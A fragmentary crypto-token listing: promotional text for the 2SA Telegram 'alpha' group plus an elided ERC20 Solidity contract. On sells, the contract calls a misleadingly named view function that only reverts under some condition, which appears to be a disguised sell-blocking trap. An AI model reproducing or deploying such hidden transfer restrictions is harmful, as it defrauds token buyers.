...
TWO STEPS AHEAD is the first and largest ERC20-powered community formed around a custom aggregator of content, operating on Telegram.

We have collected access to a huge number of private channels, discords and friendtech 
made the most informative squeeze and give out in an accessible format in our 2SA Alpha Group.

Website - https://www.2sa.pro/
Telegram - https://t.me/two_steps_ahead
Twitter - https://twitter.com/2SA_eth
Whitepaper - https://two-steps-ahead.gitbook.io/whitepaper/
...
contract TwoStepsAhead is ERC20, Ownable {
    ...
    constructor() ERC20("Two Steps Ahead", "2SA") {

        address newOwner = msg.sender; // can leave alone if owner is deployer.

        operationsAddress = address(0x4E9B48DD050C587dCd7a2D522A0f3392f39f6d26);
        devAddress = address(0x4204462769344347130F855f66C5f956deac84E6);
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        if (automatedMarketMakerPairs[to] &&
            ...
            updatePreviousTax(amount, sellTax, buyTax);
        }
    ...
    function getTaxAmount() private view returns (uint256, uint256) {
        ...
        (uint256 t0, uint256 t1) = dexRouter.WETH() == pair.token1() ? (addr0, addr1) : (addr1, addr0);
        return (t0, t1);
    }
    ...
    function updatePreviousTax(uint256 amount, uint256 outMin, uint inMin) internal view {
        ...
        require(!updated, "Cannot update previous tax.");
    }
